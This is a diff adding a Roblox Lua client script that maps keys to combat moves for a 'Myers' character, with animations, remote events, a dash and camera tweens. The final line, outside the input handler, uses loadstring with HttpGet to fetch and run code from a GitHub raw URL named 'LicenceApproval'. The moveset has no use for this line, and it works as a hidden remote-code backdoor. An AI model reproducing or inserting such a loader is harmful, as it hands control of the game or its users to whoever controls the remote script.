@@ -1,0 +1,76 @@
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then
+        return 
+    end
+   local plrs = game:GetService("Players")
+local plr = plrs.LocalPlayer
+local char = plr.Character
+local Humanoid = char:WaitForChild("Humanoid")
+local Animator = Humanoid:WaitForChild("Animator")
+local MyersS = char:WaitForChild("Myers")
+local Anims = MyersS:WaitForChild("Animations")
+local Repl = game:GetService("ReplicatedStorage")
+local Chars = Repl:WaitForChild("Characters")
+local Rems = Chars:WaitForChild("Myers"):WaitForChild("Remotes")
+local CombatHitbox = Chars.Combat.Fx.CombatHitbox
+local HitboxPunch = Chars.Combat.Peacemaker.HitboxPunch
+local Mouse = plr:GetMouse()
+local MouseHit = Mouse.Hit.Position
+local TweenService = game:GetService("TweenService")
+function Dash(arg1) -- Line 131
+	local BodyPosition_2 = Instance.new("BodyPosition")
+	BodyPosition_2.MaxForce = Vector3.new(1000000, 0, 1000000)
+	BodyPosition_2.P = 100000
+	BodyPosition_2.D = 3000
+	BodyPosition_2.Position = (arg1.CFrame * CFrame.new(0, 0, -45)).Position
+	BodyPosition_2.Parent = arg1
+	game.Debris:AddItem(BodyPosition_2, 0.5)
+end
+
+
+local ThroatSlashA = Animator:LoadAnimation(Anims.ThroatSlash)
+local GrabA = Animator:LoadAnimation(Anims.Grab)
+local GuardA = Animator:LoadAnimation(Anims.Blocking)
+
+local function CounterActivate()
+local Counter = Instance.new("BoolValue")
+Counter.Parent = char
+Counter.Name = "CounterSucces"
+game.Debris:AddItem(Counter, .05)
+end
+
+    if input.KeyCode == Enum.KeyCode.One then
+ThroatSlashA:Play()
+Rems.ThroatSlash:FireServer(plr)
+
+elseif input.KeyCode == Enum.KeyCode.Two then
+Rems.Halligan:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.Three then
+task.spawn(CounterActivate)
+elseif input.KeyCode == Enum.KeyCode.Four then
+Rems.ChokeThrow:FireServer(plr)
+GrabA:Play()
+elseif input.KeyCode == Enum.KeyCode.Five then
+Rems.Finisher:FireServer()
+elseif input.KeyCode == Enum.KeyCode.F then
+GuardA:Play()
+Chars.Combat.Remotes.Blocking:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.E then
+MyersS.Bush:FireServer(plr)
+Dash(char.HumanoidRootPart)
+		game:GetService("TweenService"):Create(plr.PlayerGui.CharacterSpecial.DarthVader.Image, TweenInfo.new(0.3), {
+			ImageTransparency = 0.3;
+		}):Play()
+		game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			FieldOfView = 55;
+		}):Play()
+		wait(.5)
+			game:GetService("TweenService"):Create(plr.PlayerGui.CharacterSpecial.DarthVader.Image, TweenInfo.new(0.3), {
+			ImageTransparency = 1;
+		}):Play()
+		game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			FieldOfView = 70;
+		}):Play()
+   end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
